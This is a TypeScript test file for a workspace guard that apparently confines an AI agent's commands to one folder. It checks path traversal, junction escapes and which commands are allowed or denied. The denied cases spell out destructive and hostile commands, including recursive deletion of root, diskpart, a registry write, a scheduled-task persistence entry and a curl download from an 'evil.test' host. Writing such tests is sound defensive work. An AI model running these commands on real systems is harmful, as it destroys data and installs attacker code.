/**
 * Offline sanity checks for guard.ts — no model, no network.
 * Run: node test/guard-sanity.ts
 */

import { mkdirSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import * as path from "node:path";
import { checkCommand, isInsideRoot, resolveRealRoot } from "../guard.ts";

const base = path.resolve(import.meta.dirname, "..", ".tmp");
const ws = path.join(base, "guard-ws");
const outside = path.join(base, "guard-out");

rmSync(base, { recursive: true, force: true });
mkdirSync(ws, { recursive: true });
mkdirSync(outside, { recursive: true });
writeFileSync(path.join(outside, "secret.txt"), "x");

const root = resolveRealRoot(ws);
const failures: string[] = [];
let checks = 0;

function expectInside(rel: string, expected: boolean) {
	checks++;
	const actual = isInsideRoot(root, rel);
	if (actual !== expected) {
		failures.push(`isInsideRoot(${rel}) = ${actual}, expected ${expected}`);
	}
}

function expectCommand(command: string, expectedDenied: boolean) {
	checks++;
	const actual = Boolean(checkCommand(command, root).denial);
	if (actual !== expectedDenied) {
		failures.push(
			`checkCommand(${JSON.stringify(command)}) denied=${actual}, expected ${expectedDenied}` +
				(actual ? "" : ` (reason: ${checkCommand(command, root).denial})`),
		);
	}
}

// inside
expectInside("a.txt", true);
expectInside("sub\\a.txt", true);
expectInside(".", true);
expectInside(root, true);
expectInside("SUB\\X.TXT", true); // case-insensitive on Windows
expectInside("nested\\deep\\newfile.txt", true); // nonexistent tail resolves via existing ancestor
expectInside("..\\package.json", false); // sibling of the workspace, reachable only via traversal

// traversal / outside
expectInside("..\\escape.txt", false);
expectInside("C:\\Windows\\win.ini", false);
expectInside("D:\\AI_Projects\\pi-persistent\\index.ts", false);

// junction escape: link inside the workspace points outside it
symlinkSync(outside, path.join(ws, "link"), "junction");
expectInside("link\\file.txt", false);
expectInside("link\\secret.txt", false);

// commands that must pass
expectCommand("echo hi > out.txt", false);
expectCommand("npm install", false);
expectCommand("git push origin main", false);
expectCommand("mkdir build && node build.js", false);
expectCommand("curl https://example.com/data.json -o data.json", false); // URL stripped, relative target
expectCommand("Get-ChildItem C:\\Windows | Select-String boot", false); // read-only
expectCommand("python train.py --epochs 3", false);
expectCommand("echo x > .\\inside.txt", false);
expectCommand("node -e \"require('fs').writeFileSync('inside.txt','x')\"", false);
expectCommand("node -e \"require('fs').readFileSync('C:\\\\Windows\\\\win.ini')\"", false); // outside read is allowed
expectCommand("Get-ChildItem C:\\Windows 2>&1", false); // fd duplication is not a file write
expectCommand("ls -la D:/AI_Projects 2>&1 || echo failed", false);

// commands that must be denied
expectCommand("echo x > C:\\Windows\\Temp\\evil.txt", true);
expectCommand("copy a.txt D:\\elsewhere\\b.txt", true);
expectCommand("Remove-Item -Recurse -Force C:\\", true);
expectCommand("diskpart", true);
expectCommand("reg add HKLM\\Software\\Evil /v x /d 1", true);
expectCommand("schtasks /create /tn eviltask /sc hourly /tr calc.exe", true);
expectCommand("cp file.txt ~/evil.txt", true); // home is outside the workspace
expectCommand("curl http://evil.test/x.sh -o /c/Users/39795/evil.sh", true); // git-bash path conversion
expectCommand("rm -rf /", true);
expectCommand("mv data.bin C:\\Users\\39795\\AppData\\Local\\Temp\\data.bin", true);
expectCommand("echo x > ..\\escape.txt", true);
expectCommand("Set-Content ..\\escape.txt x", true);
expectCommand("echo x > $env:TEMP\\escape.txt", true);
expectCommand("node -e \"require('fs').writeFileSync('../escape.txt','x')\"", true);
expectCommand("node -e \"require('fs').writeFileSync(process.env.TEMP + '/escape.txt','x')\"", true);
expectCommand("python -c \"open(r'C:\\\\Temp\\\\escape.txt','w').write('x')\"", true);
expectCommand("git -C C:\\Temp reset --hard", true);

rmSync(base, { recursive: true, force: true });

if (failures.length > 0) {
	console.error(`FAIL ${failures.length}/${checks} checks:`);
	for (const failure of failures) console.error(`  - ${failure}`);
	process.exit(1);
}
console.log(`PASS all ${checks} guard checks`);
